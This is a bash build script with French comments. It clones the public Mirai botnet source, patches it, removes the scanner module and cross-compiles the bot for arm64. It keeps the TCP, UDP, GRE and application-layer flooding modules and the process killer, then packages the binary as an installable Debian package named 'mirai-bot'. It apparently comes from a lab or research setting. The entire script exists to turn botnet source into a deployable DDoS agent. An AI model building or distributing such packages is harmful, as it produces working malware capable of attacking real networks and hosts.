#!/bin/bash

set -e

REPO_URL="https://github.com/jgamblin/Mirai-Source-Code.git"
REPO_DIR="Mirai-Source-Code"
ARCH="arm64"
PACKAGE_NAME="mirai-bot"
VERSION="1.0"
MAINTAINER="Joachim Schmidt <joachim.schmidt@hesge.ch>"
DESCRIPTION="Mirai bot modifié (sans propagation ni scan)."

rm -rf "${REPO_DIR}"

# Cloner si nécessaire
if [ ! -d "$REPO_DIR" ]; then
    git clone "$REPO_URL"
fi

cd "$REPO_DIR/mirai/bot"
find . -name '*.o' -delete

# Corriger LOCAL_ADDR : déclarer une seule fois dans main.c, déclarer extern dans includes.h

# Remplacer la déclaration globale dans includes.h par un extern
sed -i 's/^ipv4_t LOCAL_ADDR;/extern ipv4_t LOCAL_ADDR;/' includes.h

# # Ajouter la vraie définition dans main.c si elle n'existe pas déjà
# grep -q "ipv4_t LOCAL_ADDR;" main.c || sed -i '1a ipv4_t LOCAL_ADDR;' main.c

# Ajouter LOCAL_ADDR une seule fois après les includes dans main.c
grep -q "ipv4_t LOCAL_ADDR;" main.c || sed -i '/^#include/!b;:a;N;/\n[^#]/!ba;s/\(#include.*\)/\1\n\nipv4_t LOCAL_ADDR;/' main.c

# Supprimer les définitions redondantes de LOCAL_ADDR dans les autres fichiers
#find . -name "*.c" ! -name "main.c" -exec sed -i \
#    '/^[[:space:]]*LOCAL_ADDR[[:space:]]*=.*/d; /^[[:space:]]*ipv4_t[[:space:]]\+LOCAL_ADDR[[:space:]]*;/d' {} \;

#find . -type f -name '*.c' -exec sed -i 's|#include "scanner.h"|// #include "scanner.h"|' {} +

# Cast (uint8_t *) sur les appels à rand_alphastr dans main.c
#sed -i 's/rand_alphastr(\([^,]*\),/rand_alphastr((uint8_t *)\1,/' main.c

# Commenter la déclaration inutile de fdsetex dans main.c
#sed -i 's/^\(\s*fd_set\s\+fdsetex\s*;\)/\/\/ \1/' main.c
#sed -i '170s/, fdsetex;/; \/\/ fdsetex;/' main.c

cd "../../.."
#./static_move.sh "$REPO_DIR/mirai/bot"
#./static_consistency.sh "$REPO_DIR/mirai/bot"
#./fix_unused_vars.sh "$REPO_DIR/mirai/bot"
#./fix_parentheses.sh "$REPO_DIR/mirai/bot"
#./fix_signednedd_cast.sh "$REPO_DIR/mirai/bot"
#./fix_tcph_init.sh "$REPO_DIR/mirai/bot"
#./fix_get_dns_resolver_return.sh "$REPO_DIR/mirai/bot"
cp "$REPO_DIR/scripts/db.sql" .
cd "$REPO_DIR/mirai/bot"

# Supprimer scanner.c s’il existe
rm -f scanner.c

# Ajouter Makefile sécurisé
cat <<'EOF' > Makefile
CC ?= gcc
CROSS_COMPILE ?=
CFLAGS = -std=c99 -O3 -Wall
LDFLAGS =
TARGET = mirai_arm

SRC = \
    main.c \
    util.c \
    table.c \
    killer.c \
    attack.c \
    attack_app.c \
    attack_tcp.c \
    attack_udp.c \
    attack_gre.c \
    checksum.c \
    rand.c \
    resolv.c

OBJ = $(SRC:.c=.o)

all: $(TARGET)

$(TARGET): $(OBJ)
	$(CC) $(OBJ) -o $@ $(LDFLAGS)

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	rm -f $(OBJ) $(TARGET)
EOF

# Compiler pour ARM
export CC=aarch64-linux-gnu-gcc
make clean
make

# Vérifier
if [ ! -f "mirai_arm" ]; then
    echo "❌ Compilation échouée"
    exit 1
fi

# Créer le paquet .deb
BUILD_DIR="../../${PACKAGE_NAME}_${VERSION}_${ARCH}"
PKG_DIR="../.."
PKG_FINAL_DIR="../../.."
mkdir -p "$BUILD_DIR/DEBIAN"
mkdir -p "$BUILD_DIR/usr/local/bin"

cp mirai_arm "$BUILD_DIR/usr/local/bin/mirai"

cat <<EOF > "$BUILD_DIR/DEBIAN/control"
Package: $PACKAGE_NAME
Version: $VERSION
Section: net
Priority: optional
Architecture: $ARCH
Maintainer: $MAINTAINER
Description: $DESCRIPTION
EOF

dpkg-deb --build "$BUILD_DIR"
mv "${PKG_DIR}/${PACKAGE_NAME}_${VERSION}_${ARCH}.deb" "${PKG_FINAL_DIR}"
cd "${PKG_FINAL_DIR}"

echo "✅ Paquet créé : ${PACKAGE_NAME}_${VERSION}_${ARCH}.deb"
